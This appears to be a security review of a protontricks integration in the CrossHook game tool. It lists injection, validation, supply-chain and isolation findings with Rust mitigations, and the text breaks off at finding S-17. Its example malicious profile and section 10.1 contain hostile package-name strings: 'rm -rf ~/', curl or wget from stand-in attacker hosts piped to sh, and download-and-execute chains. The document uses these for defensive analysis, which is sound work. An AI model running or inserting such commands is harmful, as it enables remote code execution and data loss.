# Security Research: Protontricks Integration

**Feature**: Protontricks/winetricks integration for Wine prefix dependency management  
**Date**: 2026-04-03  
**Researcher**: Security Specialist  
**Scope**: Command injection, input validation, subprocess execution, supply chain, privilege and isolation risks

---

## Executive Summary

This feature introduces 22 security findings across five risk areas. The dominant threat is **command injection via community profile `required_protontricks` fields**: malicious TOML profiles distributed through CrossHook taps can embed shell metacharacters or flag-injection strings in package names that reach the protontricks subprocess. The primary mitigation is `Command::new("protontricks")` with individual `.arg()` calls (never shell interpolation), a `--` flag separator before verbs, and structural validation (`starts_with('-')` rejection + `[a-z0-9_-]` character allowlist) applied at both tap sync time and install time — mirroring the existing `validate_branch_name` pattern in `community/taps.rs`.

Secondary risks include: environment variable leakage into the subprocess (mitigated by `env_clear()` + explicit restoration), information disclosure through raw subprocess output reaching the UI (mitigated by typed IPC error enums), supply chain risks from winetricks downloading packages over HTTPS with SHA256 verification (mitigated by never passing `--force`), and concurrent prefix access causing Wine registry corruption (mitigated by a per-prefix async mutex).

The feature can ship securely with 6 CRITICAL and 14 WARNING mitigations addressed. 7 ADVISORY findings are deferrable with documented justification. A second review of the tech-designer's architecture specification (2026-04-03) identified three additional issues: `--no-bwrap` is hardcoded by default in the installer (contradicting the isolation recommendation in S-13), raw subprocess stdout/stderr lines are streamed to the frontend via `app.emit` (CWE-209 — same class as S-11), and `BinaryNotFound { searched_path }` leaks filesystem path through the IPC error boundary.

---

## Findings by Severity

### CRITICAL

Feature cannot ship without addressing these.

| ID   | Finding                                                                                            | Area                 |
| ---- | -------------------------------------------------------------------------------------------------- | -------------------- |
| S-01 | Malicious TOML profile `required_protontricks` packages passed to protontricks                     | Command Injection    |
| S-02 | Shell metacharacters in package names reach subprocess                                             | Command Injection    |
| S-03 | Missing package name allowlist — any string accepted from TOML                                     | Input Validation     |
| S-06 | protontricks `-c` flag must be explicitly excluded from community profiles                         | Subprocess Execution |
| S-19 | `vcrun2019 && curl ...` in a single array element — `.args(joined)` regression risk                | Command Injection    |
| S-22 | Manual package name input (UI free-form field) requires same allowlist validation as TOML profiles | Input Validation     |
| S-27 | Raw subprocess stdout/stderr lines streamed to frontend via `app.emit` — CWE-209 violation         | Information Disclosure |

### WARNING

Must address before shipping; alternatives acceptable.

| ID   | Finding                                                                                       | Area                   |
| ---- | --------------------------------------------------------------------------------------------- | ---------------------- |
| S-04 | Steam App ID integer validation missing                                                       | Input Validation       |
| S-05 | Prefix path traversal via WINEPREFIX override                                                 | Input Validation       |
| S-07 | Environment variable leakage into subprocess scope                                            | Subprocess Execution   |
| S-08 | Winetricks downloads lack HTTPS enforcement by default on some mirror configs                 | Supply Chain           |
| S-09 | Outdated winetricks version causes SHA256 mismatches, silent bypass temptation                | Supply Chain           |
| S-10 | Concurrent protontricks calls against same prefix cause corruption                            | Privilege & Isolation  |
| S-11 | Error messages may leak prefix paths or system details to UI                                  | Information Disclosure |
| S-15 | `protontricks_path` in settings.toml is user-controlled — arbitrary executable                | Subprocess Execution   |
| S-16 | Wine prefix symlink not checked before handing path to protontricks                           | File System            |
| S-17 | `apply_host_environment` forwards `DBUS_SESSION_BUS_ADDRESS` and secrets-adjacent vars        | Subprocess Execution   |
| S-20 | `user_extra_protontricks` field applies same allowlist requirement as `required_protontricks` | Input Validation       |
| S-21 | Flatpak `protontricks` binary path requires invocation via `flatpak run`, not direct path     | Subprocess Execution   |
| S-23 | `--no-bwrap` hardcoded by default in installer — degrades bwrap isolation for all invocations | Process Isolation      |
| S-24 | `PackageDependencyState.last_error` returned through IPC to frontend — raw error content      | Information Disclosure |
| S-25 | `BinaryNotFound { searched_path: String }` leaks filesystem path through IPC error boundary   | Information Disclosure |
| S-26 | `DetectBinaryResult.binary_path` returns `"flatpak run ..."` command string — not a path      | Subprocess Execution   |

### ADVISORY

Best practice; safe to defer with documented justification.

| ID   | Finding                                                                            | Area                   |
| ---- | ---------------------------------------------------------------------------------- | ---------------------- |
| S-12 | No audit log for which community profiles triggered which installs                 | Auditability           |
| S-13 | protontricks bwrap sandbox is present by default — `--no-bwrap` degrades isolation | Process Isolation      |
| S-14 | Prefix path symlink attacks (TOCTOU)                                               | File System            |
| S-18 | Log injection via control characters in verb names or prefix names                 | Information Disclosure |

---

## 1. Command Injection Analysis

### 1.1 Attack Surface: Community Profile `required_protontricks` Field

**Severity: CRITICAL**

Community profiles are user-shared TOML files distributed through CrossHook taps. The proposed `required_protontricks: Vec<String>` field introduces a direct attack vector: a malicious community profile author can embed shell metacharacters or flag injection strings in package names.

**Example malicious TOML:**

```toml
[metadata]
game_name = "Example Game"

[profile]
required_protontricks = [
  "vcrun2019; rm -rf ~/",
  "--gui",
  "$(curl malicious.example.com | sh)",
  "vcrun2019 && wget http://attacker.example.com/payload -O /tmp/p && chmod +x /tmp/p && /tmp/p"
]
```

**Protontricks CLI invocation pattern:**

```
protontricks <APPID> <ACTIONS>
```

The `<ACTIONS>` are passed directly to winetricks. If CrossHook constructs a command string via string interpolation and passes to a shell:

```rust
// VULNERABLE - do not do this
Command::new("sh").arg("-c").arg(format!("protontricks {} {}", app_id, packages.join(" ")))
```

Any package string containing `;`, `&&`, `||`, `|`, `$()`, `` ` ``, `>`, `<`, or `\n` triggers injection.

**Mitigation (required):**
Use `Command::new("protontricks")` with individual `.arg()` calls. Each package name must be passed as a distinct argument. This bypasses shell interpretation entirely:

```rust
// SAFE - shell metacharacters are not interpreted
let mut cmd = Command::new("protontricks");
cmd.arg(app_id.to_string());
for package in &validated_packages {
    cmd.arg(package); // each package is its own argument
}
```

**Confidence: High** — Rust's `Command::new` with individual `.arg()` calls is confirmed to bypass shell interpretation (Rust std docs, StackHawk Rust security guide). The existing CrossHook codebase in `runtime_helpers.rs` already uses this pattern correctly for proton and gamescope invocations.

### 1.2 Flag Injection via Package Names

**Severity: CRITICAL**

Even with `Command::new` (no shell), package names prefixed with `-` or `--` are interpreted as flags by protontricks/winetricks. A malicious profile could inject:

```toml
required_protontricks = [
  "--gui",
  "-c",
  "rm -rf ~/",
]
```

The `-c` flag is especially dangerous: `protontricks -c <COMMAND> <APPID>` executes arbitrary commands in the Proton Wine environment. If a package list starting with `-c` reaches protontricks, followed by arbitrary strings, this achieves arbitrary Wine environment command execution.

**Mitigation (required):**
All package names must be validated against a strict allowlist before any subprocess call. Additionally, a `--` argument separator can be inserted before package arguments to prevent flag interpretation:

```rust
cmd.arg(app_id.to_string());
cmd.arg("--"); // prevents remaining args from being parsed as flags
for package in &validated_packages {
    cmd.arg(package);
}
```

**Confidence: High** — Protontricks README confirms `-c <COMMAND> <APPID>` for arbitrary command execution. Standard Unix convention: `--` terminates flag parsing.

---

## 2. Input Validation Requirements

### 2.1 Package Name Allowlist

**Severity: CRITICAL**

Winetricks verb/package names follow a strict naming convention derived from the canonical `files/verbs/all.txt` in the winetricks repository:

- All lowercase
- Only alphanumeric characters, underscores (`_`), and hyphens (`-`)
- No spaces, semicolons, pipes, quotes, dollar signs, or other metacharacters
- Examples: `vcrun2019`, `dotnet48`, `d3dx9`, `corefonts`, `xact`, `dxvk2070`

**Required validation regex:**

```rust
// Allowlist pattern for winetricks verb names
static VERB_PATTERN: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"^[a-z0-9][a-z0-9_\-]{0,63}$").unwrap()
});

fn is_valid_verb(verb: &str) -> bool {
    VERB_PATTERN.is_match(verb)
}
```

**Recommended approach — dual-layer validation:**

1. **Structural validation**: regex match against the allowlist pattern (above)
2. **Known-verb validation**: validate against a curated set of known-safe verbs for common packages. Unknown verbs matching the structural pattern should produce a WARNING but not hard-block (winetricks adds new verbs regularly).

**Trade-off: static allowlist vs. structural regex**

The business requirements (BR-1) call for a static allowlist of known-safe verbs. This provides the strongest guarantee: only explicitly approved verbs can execute. However, winetricks has 500+ verbs and adds new ones with each release. A static allowlist in CrossHook's codebase would need maintenance on every winetricks release and would immediately block users of new verbs in up-to-date winetricks installations.

The structural regex approach (`^[a-z0-9][a-z0-9_\-]{0,63}$`) eliminates all injection-capable characters by construction. An unknown structurally-valid verb reaching protontricks results in a "verb not found" error from winetricks — not arbitrary code execution. The attack surface difference between the two approaches is therefore: a static allowlist prevents unknown-but-structurally-valid verbs from reaching protontricks (a defense-in-depth layer), while the regex prevents all injection vectors that matter for the stated threat model (malicious community profiles).

**Recommendation**: Implement structural regex validation as the hard gate. Maintain a curated set of common safe verbs (`vcrun2019`, `dotnet48`, `d3dx9`, `corefonts`, `xact`, `dxvk`, etc.) for UI display purposes (human-readable labels) and to issue a WARNING on unknown verbs — but do not block structurally-valid unknown verbs. Tech-designer and business-analyzer should make the final call on whether to block or warn on unknown verbs, given product risk tolerance.

**Confidence: High** — Winetricks source and verb files confirm the naming convention. Pattern is derived from observed canonical verb names.

### 2.2 Steam App ID Validation

**Severity: WARNING**

Steam App IDs are unsigned 32-bit integers. A malicious profile could provide a non-integer `app_id` or an out-of-range value that causes unexpected protontricks behavior.

**Required validation:**

```rust
fn validate_app_id(app_id: u32) -> Result<u32, ValidationError> {
    if app_id == 0 {
        return Err(ValidationError::InvalidAppId("App ID cannot be zero".into()));
    }
    Ok(app_id)
}
```

App IDs should be sourced from CrossHook's internal Steam discovery layer (already typed as `u32` in existing code), not from community profile TOML. The `app_id` for prefix resolution should always come from the game record, never from the community profile itself.

**Confidence: High** — Protontricks README confirms App ID is a Steam numeric identifier.

### 2.3 Prefix Path Validation

**Severity: WARNING**

If CrossHook allows WINEPREFIX path to be influenced by community profile data or user-editable config, path traversal or symlink attacks become feasible. A path like `../../.config/crosshook` could target CrossHook's own config directory.

**Required validation:**

- Prefix paths must be derived from Steam's `STEAM_COMPAT_DATA_PATH` or CrossHook's own resolved path for the game, not from any user-supplied string in a community profile.
- If prefix path validation is needed at any boundary, canonicalize and verify the resolved path resides within the expected Steam library directory:

```rust
fn validate_prefix_path(prefix: &Path, expected_root: &Path) -> Result<(), ValidationError> {
    let canonical = prefix.canonicalize()?;
    if !canonical.starts_with(expected_root) {
        return Err(ValidationError::PathTraversal);
    }
    Ok(())
}
```

**Confidence: Medium** — Based on general path traversal patterns; actual risk depends on where prefix path is sourced.

### 2.4 TOML Schema Validation for `required_protontricks`

**Severity: WARNING**

The TOML Rust parser (`toml` crate) is not vulnerable to prototype pollution or known injection (unlike JS parsers). However, deeply nested or excessively long arrays can create resource exhaustion in some implementations.

**Required constraints:**

- Maximum 50 verbs per profile (generous ceiling; typical profiles need 2–5)
- Maximum verb length: 64 characters
- Schema version checking before processing `required_protontricks`
- Reject profiles that specify `required_protontricks` with schema_version < current minimum

**Confidence: High** — TOML security advisories confirm DoS risks in other implementations; Rust's `toml` crate is more resilient but length limits add defense-in-depth.

---

## 3. Subprocess Execution Security

### 3.1 Use `Command::new` — Never Shell Invocation

**Severity: CRITICAL** (if violated)

CrossHook's existing subprocess pattern in `runtime_helpers.rs` already uses `tokio::process::Command::new` with individual `.arg()` calls — this is the correct pattern. The protontricks invocation must follow the same pattern without exception.

**Prohibited patterns:**

```rust
// NEVER do any of these for protontricks invocation
Command::new("sh").arg("-c").arg(format!("protontricks {} {}", ...));
Command::new("bash").arg("-c").arg(&cmd_string);
std::process::Command::new("sh").args(&["-c", &cmd_string]);
```

**Required pattern:**

```rust
let mut cmd = tokio::process::Command::new("protontricks");
cmd.arg("--no-runtime");     // if applicable, prevent interactive UI
cmd.arg(app_id.to_string()); // from internal game record, not TOML
cmd.arg("--");               // flag separator
for verb in &validated_verbs {
    cmd.arg(verb);           // pre-validated against allowlist
}
cmd.env_clear();             // start from clean environment
// explicitly restore only what protontricks needs
```

**Confidence: High** — Confirmed by Rust documentation and StackHawk Rust security guide that `Command::new` with `.arg()` does not invoke a shell.

### 3.2 Environment Variable Handling

**Severity: WARNING**

Protontricks needs certain environment variables to function (`STEAM_ROOT`, `STEAM_COMPAT_DATA_PATH`, `HOME`, `PATH`). However, passing the full parent process environment risks leaking sensitive variables (API keys, session tokens, `CROSSHOOK_*` internal vars).

**Required approach:**

```rust
cmd.env_clear();
cmd.env("HOME", home_dir);
cmd.env("PATH", "/usr/local/bin:/usr/bin:/bin");  // minimal, controlled PATH
cmd.env("STEAM_ROOT", steam_root);
cmd.env("STEAM_COMPAT_DATA_PATH", prefix_path);
// Do NOT forward: CROSSHOOK_*, secrets, tokens, XDG_RUNTIME_DIR (unless needed)
```

**Confidence: Medium** — Protontricks issue #327 confirms WINETRICKS and WINE env vars are needed; exact minimal set requires testing.

### 3.3 Timeout and Kill Handling

**Severity: WARNING**

Winetricks package installs can hang indefinitely (network timeouts, interactive prompts, broken downloads). CrossHook must enforce a timeout on protontricks invocations.

**Required implementation:**

```rust
tokio::time::timeout(
    Duration::from_secs(300), // 5-minute cap per invocation
    cmd.output()
).await
.map_err(|_| ProtontricksError::Timeout)?;
```

Stalled installs should be killed (SIGTERM, then SIGKILL after grace period) and the user informed with an actionable message.

**Confidence: High** — Winetricks is known to stall on download failures and SHA256 mismatches.

### 3.4 Stdout/Stderr Capture vs. Passthrough

**Severity: ADVISORY**

Error output from winetricks is verbose and may contain internal paths, wine debug output, or credentials passed as environment variables in the wine prefix (edge case). CrossHook should capture stderr, log it to internal logs, and present only a sanitized summary to the UI.

---

## 4. Supply Chain Risks

### 4.1 Winetricks Downloads from Vendor Servers

**Severity: WARNING**

Winetricks downloads packages (Visual C++ runtimes, .NET, DirectX, etc.) from Microsoft and other vendor servers over HTTPS. It uses SHA256 checksums hardcoded in the winetricks script to verify integrity. However:

1. **Stale checksums**: Microsoft frequently relocates download URLs and rotates files, causing SHA256 mismatches. Users encounter dialogs offering to proceed despite mismatch — this is a supply chain risk if CrossHook auto-accepts.
2. **No MITM protection beyond HTTPS**: Winetricks relies on HTTPS certificate validation for the transport layer. No additional pinning is performed.
3. **Outdated winetricks**: Distribution-packaged winetricks (e.g., from apt/pacman) often lags behind upstream by months. Outdated versions have stale checksums and broken download URLs.

**Required mitigations:**

- CrossHook must **never** run protontricks with `--force` or any flag that bypasses checksum verification.
- CrossHook must surface winetricks checksum failures as explicit errors — not silently retry.
- Recommend (but cannot enforce) that users maintain an up-to-date winetricks via Flatpak or direct download from the Winetricks GitHub repository.
- Document in UI that winetricks downloads from Microsoft/vendor servers and explain what is being installed before triggering.

**Confidence: High** — Multiple winetricks GitHub issues (SHA256 mismatch errors) and forum posts confirm this is a real and recurring operational risk.

### 4.2 Protontricks Itself as a Dependency

**Severity: ADVISORY**

Protontricks is a Python-based wrapper maintained by the community (Matoking/protontricks). It has zero known CVEs in Snyk's database as of research date. The primary supply chain risk is:

- Users may have outdated protontricks installed
- The Flatpak version (`com.github.Matoking.protontricks`) is the recommended distribution channel and receives more frequent updates

**Required approach:**

- CrossHook should detect protontricks version and warn if below a minimum supported version.
- Prefer detection of Flatpak protontricks (`flatpak run com.github.Matoking.protontricks`) over system protontricks when available.

**Confidence: Medium** — Based on protontricks README and Snyk scan data.

---

## Dependency Security

Protontricks and winetricks are external dependencies that download and execute third-party binaries at runtime. This section consolidates security analysis of that dependency chain.

### Winetricks Package Downloads

Winetricks downloads installers and DLLs from Microsoft CDNs and archive.org over HTTPS, then verifies each download against a SHA256 checksum hardcoded in the winetricks script. Key risks:

- **Stale checksums (S-09)**: Microsoft frequently relocates download URLs; distribution-packaged winetricks (apt/pacman) often lags upstream by months, causing SHA256 mismatch errors. CrossHook must never pass `--force` or any checksum-bypass flag. Prefer Flatpak winetricks (`com.github.Matoking.protontricks`) which receives more frequent updates.
- **No additional integrity beyond HTTPS + SHA256 (S-08)**: Winetricks relies on HTTPS certificate validation for transport. No additional pinning. This is the current industry norm for this class of tool.
- **Windows EXE execution**: Verified installers (e.g., `vc_redist.exe`, `dotnetfx.exe`) are executed inside the Wine prefix. Wine is not a security sandbox — malicious content reaching this stage executes with user privileges. The verb allowlist (S-03) is the primary gate preventing unapproved packages from reaching this stage.

### Protontricks as a Dependency

Protontricks (Matoking/protontricks) is a Python-based CLI wrapper with zero known CVEs as of 2026-04-03 (Snyk). It uses bubblewrap (bwrap) containerization by default for Steam Runtime isolation (S-13). Flatpak protontricks adds a second sandbox layer. CrossHook should prefer Flatpak protontricks where available and detect the installed version to enforce a minimum version floor (Open Question #5).

### Required Constraints

1. Never pass `--force` or any checksum-bypass flag to protontricks/winetricks
2. Surface SHA256 mismatch as an explicit user-facing error — do not silently retry
3. Do not pass `--no-bwrap` by default — expose only as user opt-in for broken environments
4. Validate all verb names before any install attempt — the verb allowlist is the primary trust enforcement point for the entire dependency chain

See `## 4. Supply Chain Risks` for full detail on findings S-08 and S-09.

---

## 5. Privilege and Isolation

### 5.1 User-Level Execution (No Elevated Privileges)

**Severity: ADVISORY** (privilege escalation would be CRITICAL)

Protontricks must run at user privilege level — **never** with `sudo` or `pkexec`. Running protontricks as root can corrupt Wine prefix file ownership and create files owned by root inside user-writable directories, leading to broken prefixes and potential local privilege escalation (via setuid binaries written to user-controlled paths).

CrossHook must not provide any UI affordance, configuration, or code path that elevates protontricks to root.

**Confidence: High** — Protontricks issue #307 confirms that running as root causes crashes and prefix corruption.

### 5.2 Concurrent Access to the Same Prefix

**Severity: WARNING**

If a user triggers protontricks (or if CrossHook re-enters the install flow) while protontricks is already running against the same Wine prefix, both processes may write to the Wine registry simultaneously, causing corruption. Wine uses its own wineserver locking internally, but protontricks itself does not implement cross-process locking.

**Required mitigation:**
CrossHook must implement a per-prefix mutex (keyed by the canonical prefix path) that prevents concurrent protontricks invocations against the same prefix:

```rust
// Pseudo-code
let prefix_key = canonical_prefix_path.to_string_lossy().to_string();
let _guard = prefix_locks.lock_for_prefix(&prefix_key).await?;
// Run protontricks
```

**Confidence: Medium** — General file-locking principles; Wine's wineserver handles some locking but not cross-process protontricks coordination.

### 5.3 Prefix Isolation Between Games

**Severity: ADVISORY**

Each Steam game should have an isolated Wine prefix (`STEAM_COMPAT_DATA_PATH` is game-specific). CrossHook must always resolve the prefix from the game's Steam record, never from community profile data. This prevents one profile from accidentally (or maliciously) installing dependencies into another game's prefix.

**Confidence: High** — Design constraint derived from protontricks architecture and Steam prefix model.

---

## 6. Information Disclosure

### 6.1 Error Messages Leaking System Paths (CWE-209 / CWE-211)

**Severity: WARNING**

Winetricks and protontricks error output includes full filesystem paths, WINEPREFIX locations, and detailed Wine debug output. If CrossHook surfaces this output directly in the UI, it exposes sensitive system details. The following categories must never appear in UI-layer error strings:

- Raw filesystem paths: prefix path, home directory, binary search path for protontricks
- System username or hostname
- Host OS version or kernel version
- Raw exception text or Rust backtraces
- HTTP error codes (show "Download failed", not "HTTP 403 Forbidden")
- The configured `prefix_path` echoed back in error messages (even though users can see it in profile settings, error messages must not surface it contextually)

**Required mitigation:**

- Capture subprocess stderr internally and log to CrossHook's debug log (ConsoleDrawer) only.
- Tauri IPC responses that flow to the React UI must contain only structured error variants — never raw stderr strings.
- Use typed error responses on the IPC boundary:

```rust
// IPC error type — no path strings, no raw subprocess output
#[derive(Serialize)]
#[serde(tag = "kind")]
pub enum ProtontricksIpcError {
    NotInstalled,
    ChecksumMismatch,
    NetworkTimeout,
    UnknownVerb { verb: String },  // verb is already validated — safe to echo
    InstallFailed,
    PrefixNotFound,               // do NOT include the path in this variant
    Timeout,
}
```

- Present user-facing errors using template messages (see UX research for full table). Example:
  - `PrefixNotFound` → "Wine prefix not found. Check your profile configuration."
  - `NotInstalled` → "protontricks is not installed. See the installation guide."
  - `InstallFailed` → "Dependency installation failed. See CrossHook logs for details."

**Confidence: High** — CWE-209 (information exposure through error messages) and CWE-211 (information exposure through externally-generated error messages). Winetricks output is known to be verbose and path-heavy.

---

## 7. Secure Coding Guidelines

### 7.1 Input Validation Module (crosshook-core)

**Pattern reference:** `community/taps.rs` already implements `validate_branch_name` using the identical approach: `starts_with('-')` rejection + character allowlist + length cap. The protontricks verb validator should follow this exact structure and live alongside it or in a shared `validation` module.

Create `protontricks/validation.rs` in `crosshook-core` (or extend a shared `validation` module — see section 10.9):

```rust
const MAX_VERBS_PER_PROFILE: usize = 50;

/// Validates a winetricks verb name for safe use as a subprocess argument.
///
/// Rejects names starting with `-` (would be interpreted as protontricks/winetricks flags)
/// and names containing characters outside `[a-z0-9_-]` (max 64 chars, lowercase only).
/// Mirrors the approach used in `validate_branch_name` in community/taps.rs.
pub fn validate_verb(verb: &str) -> Result<(), ValidationError> {
    if verb.starts_with('-') {
        return Err(ValidationError::InvalidVerb(verb.to_string()));
    }
    if verb.is_empty() || verb.len() > 64 {
        return Err(ValidationError::InvalidVerb(verb.to_string()));
    }
    if !verb.chars().all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || matches!(c, '_' | '-')) {
        return Err(ValidationError::InvalidVerb(verb.to_string()));
    }
    Ok(())
}

pub fn validate_protontricks_verbs(verbs: &[String]) -> Result<Vec<String>, ValidationError> {
    if verbs.len() > MAX_VERBS_PER_PROFILE {
        return Err(ValidationError::TooManyVerbs(verbs.len()));
    }
    let mut validated = Vec::with_capacity(verbs.len());
    for verb in verbs {
        validate_verb(verb)?;
        validated.push(verb.clone());
    }
    Ok(validated)
}
```

Note: this implementation uses character iteration (matching `validate_branch_name`) rather than a compiled regex, keeping it consistent with the established codebase pattern and avoiding the `once_cell`/`regex` dependency for a simple structural check.

### 7.2 Subprocess Invocation Module (crosshook-core)

Create `protontricks/runner.rs`:

```rust
pub async fn run_protontricks(
    app_id: u32,          // Must come from internal game record, never from TOML
    verbs: &[String],     // Must be pre-validated by validate_protontricks_verbs()
    prefix_path: &Path,   // Must be resolved from Steam discovery, not from TOML
) -> Result<ProtontricksOutput, ProtontricksError> {
    let mut cmd = tokio::process::Command::new("protontricks");
    cmd.arg("-q");                 // --unattended: suppress all interactive prompts (winetricks passthrough)
    cmd.arg(app_id.to_string());
    cmd.arg("--");                 // Prevent verb args being parsed as flags
    for verb in verbs {
        cmd.arg(verb);
    }

    // Minimal, controlled environment — mirrors apply_host_environment() for needed vars.
    // Analogous to git_security_env_pairs() in community/taps.rs but stricter (env_clear first).
    cmd.env_clear();
    cmd.env("HOME", home_dir()?);
    cmd.env("PATH", "/usr/local/bin:/usr/bin:/bin");
    cmd.env("DISPLAY", std::env::var("DISPLAY").unwrap_or_default());
    cmd.env("WAYLAND_DISPLAY", std::env::var("WAYLAND_DISPLAY").unwrap_or_default());
    cmd.env("XDG_RUNTIME_DIR", std::env::var("XDG_RUNTIME_DIR").unwrap_or_default());
    cmd.env("DBUS_SESSION_BUS_ADDRESS", std::env::var("DBUS_SESSION_BUS_ADDRESS").unwrap_or_default());
    cmd.env("STEAM_COMPAT_DATA_PATH", prefix_path);
    // Suppress interactive winetricks UI and terminal prompts
    cmd.env("WINETRICKS_GUI", "none");
    cmd.env("TERM", "dumb");
    // Prevent winetricks from reading or writing user git/wine config
    // (mirrors GIT_CONFIG_GLOBAL=/dev/null pattern from community/taps.rs)

    cmd.stdout(Stdio::piped());
    cmd.stderr(Stdio::piped());
    cmd.kill_on_drop(true);        // Ensure child is killed if the future is dropped (timeout path)

    // Enforce timeout
    let output = tokio::time::timeout(
        Duration::from_secs(300),
        cmd.output()
    )
    .await
    .map_err(|_| ProtontricksError::Timeout)?
    .map_err(ProtontricksError::Io)?;

    // Log stderr internally, never return raw to UI
    if !output.stderr.is_empty() {
        tracing::debug!(stderr = %String::from_utf8_lossy(&output.stderr), "protontricks stderr");
    }

    if output.status.success() {
        Ok(ProtontricksOutput::Success)
    } else {
        Err(ProtontricksError::Failed(output.status.code()))
    }
}
```

### 7.3 Community Profile Schema Extension

In `community_schema.rs`, the `required_protontricks` field must be validated at parse time:

```rust
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, Default)]
pub struct CommunityProfileManifest {
    // existing fields...
    #[serde(default)]
    pub required_protontricks: Vec<String>,
}

impl CommunityProfileManifest {
    pub fn validate_protontricks_verbs(&self) -> Result<Vec<String>, ValidationError> {
        validate_protontricks_verbs(&self.required_protontricks)
    }
}
```

Validation must occur before any install attempt, not inside the subprocess runner.

---

## 8. Trade-off Recommendations

| Decision               | Option A                            | Option B                            | Recommendation                                                                                                              |
| ---------------------- | ----------------------------------- | ----------------------------------- | --------------------------------------------------------------------------------------------------------------------------- |
| Package validation     | Strict allowlist (known verbs only) | Structural regex (pattern match)    | **Structural regex + curated warning set** — winetricks evolves; hard allowlist breaks on new verbs                         |
| Install trigger        | Auto-install on launch              | User-confirms before install        | **User-confirms** — installing Windows runtimes is a significant operation; build trust with explicit consent               |
| Error reporting        | Full winetricks output in UI        | Sanitized template messages         | **Sanitized messages** — paths and wine debug output should not reach UI layer                                              |
| protontricks detection | Require system-installed            | Prefer Flatpak, fall back to system | **Prefer Flatpak** — receives faster security updates; adds sandbox layer around protontricks process                       |
| `-c` flag prevention   | Allowlist prevents it structurally  | Explicit blocklist for `-` prefix   | **Structural allowlist** — a regex `^[a-z0-9]` naturally excludes `-` prefixed flags                                        |
| `--no-bwrap` flag      | Never pass it                       | Pass it when bwrap causes crashes   | **Never pass by default** — bwrap provides meaningful process isolation; only surface as user opt-in when explicitly broken |

---

## 9. Open Questions

1. **Which App ID to use?** Community profiles are associated with a specific game's CrossHook profile — the App ID should always come from that association, never embedded in the TOML. Confirm with tech-designer.

2. **Install idempotency**: How does CrossHook track which verbs have already been installed in a prefix to avoid re-running protontricks on every launch? This needs SQLite tracking in the metadata DB (already at schema v13 — 18 tables).

3. **Flatpak sandboxing of protontricks**: API researcher confirms Flatpak protontricks has sandbox restrictions that break multi-library setups (multiple Steam library paths). If the user's games are spread across libraries, Flatpak protontricks may fail to find them. CrossHook should detect this failure mode and surface it as a diagnostic rather than a silent error. The system binary fallback may be required for multi-library users.

4. **`--no-runtime` flag compatibility**: Not confirmed as a valid protontricks flag by API research. Use `-q` / `--unattended` (winetricks passthrough) to suppress interactive prompts instead. This is the confirmed flag for automation. Remove `--no-runtime` from the runner code example.

5. **Winetricks version minimum**: What is the minimum winetricks version CrossHook should require to ensure SHA256 verbs for common packages are current?

6. **Per-prefix lock storage**: Where should the prefix mutex state be stored — in-process (AsyncMutex hashmap), or on-disk lockfile for cross-process safety?

7. **`winetricks list-installed` env isolation**: The API researcher's example for querying installed verbs uses `Command::new(winetricks_path).arg("list-installed").env("WINEPREFIX", prefix_path)` without `env_clear()`. For this read-only query, inheriting the parent environment is lower risk than for install invocations, but for consistency the same `env_clear()` + minimal env restoration pattern should apply. The WINEPREFIX query only needs `HOME`, `PATH`, and `WINEPREFIX` set.

8. **`winetricks.log` vs `list-installed` for idempotency**: API researcher notes `$WINEPREFIX/winetricks.log` is more reliable than `list-installed` for some edge cases. Security implication: CrossHook should parse this file carefully — it contains one verb per line in installation order but is user-writable. A malicious local file is user-controlled (low threat), but the parser should handle unexpected content without crashing.

---

## 10. Additional Findings (from peer review)

### 10.1 S-19: Single-Argument Space-Split Injection

**Severity: CRITICAL**

The recommendations-agent flagged a subtle but critical point: `Command::new` with `.arg()` passes each element of `Vec<String>` as a single OS-level argument. However, if the TOML parser or a deserialization path ever splits on whitespace before elements reach `cmd.arg()`, a single array element `"vcrun2019 && curl http://evil.com | sh"` would be split into multiple arguments that winetricks interprets as separate verbs. More critically: if CrossHook ever uses `.args()` with a space-joined string or calls `.arg(&verbs.join(" "))`, the entire injection surface re-opens at the OS level on some invocation paths.

**Confirmed safe pattern — each verb is its own `.arg()` call:**

```rust
for verb in &validated_verbs {
    cmd.arg(verb);  // ONE arg per loop iteration, never cmd.arg(verbs.join(" "))
}
```

The structural regex `^[a-z0-9][a-z0-9_\-]{0,63}$` rejects spaces, so this is defense-in-depth: even if the join error occurred, validated verbs contain no spaces and therefore cannot be split. Both controls must be present.

**Confidence: High** — Rust `Command` documentation confirms argument passing bypasses shell; the regression risk is code review drift toward `.args([joined_string])`.

### 10.2 S-15: `protontricks_path` in `settings.toml` — Arbitrary Executable

**Severity: WARNING**

The `settings.toml` file (user-editable, stored in CrossHook config dir) is expected to include a `protontricks_path` field. Since this is user-controlled, a user could set it to any arbitrary executable path. While this is intentional user configuration (not a community profile attack), CrossHook must still validate the path before invocation, consistent with the `check_required_executable` pattern already used in `profile/health.rs`.

**Required validation (mirrors existing `check_required_executable`):**

- Path must be non-empty
- Path must resolve to an existing file (not a directory, not a symlink to a non-file)
- File must have executable permission (`mode & 0o111 != 0`)
- Path must be absolute (reject relative paths that depend on working directory)

Note: Unlike community profile data, this field is intentionally user-configurable — it is not a security boundary against the user themselves. The risk being mitigated is misconfiguration (typo, stale path) and accidental invocation of a non-executable or wrong-type file.

**Confidence: High** — `check_required_executable` in `profile/health.rs:209` already implements this exact pattern; reuse it.

### 10.3 S-16: Wine Prefix Path Symlink Not Checked Before Protontricks Invocation

**Severity: WARNING**

`db.rs` already implements `symlink_metadata(...).file_type().is_symlink()` checks before opening the SQLite database. `script_runner.rs` skips symlinks during trainer staging. However, the Wine prefix path handed to protontricks (`STEAM_COMPAT_DATA_PATH`) is not checked for symlinks before being passed. A symlink at the prefix path could redirect protontricks operations to an unintended filesystem location.

**Context from codebase:** `resolve_wine_prefix_path` in `runtime_helpers.rs` resolves `pfx/` subpath but does not call `symlink_metadata`. The existing `db.rs` pattern is the right template.

**Required mitigation:**

```rust
fn validate_prefix_not_symlink(prefix: &Path) -> Result<(), ProtontricksError> {
    let meta = std::fs::symlink_metadata(prefix)
        .map_err(|e| ProtontricksError::PrefixIo(e))?;
    if meta.file_type().is_symlink() {
        return Err(ProtontricksError::PrefixIsSymlink(prefix.to_path_buf()));
    }
    Ok(())
}
```

**Confidence: High** — Pattern established in `db.rs:15`. Practical risk is lower than for the database (prefix symlinks could exist legitimately in some Steam setups) — so consider logging a warning rather than hard-failing, unless the symlink resolves outside the expected Steam library root.

### 10.4 S-17: `apply_host_environment` Forwards DBUS and Secrets-Adjacent Variables

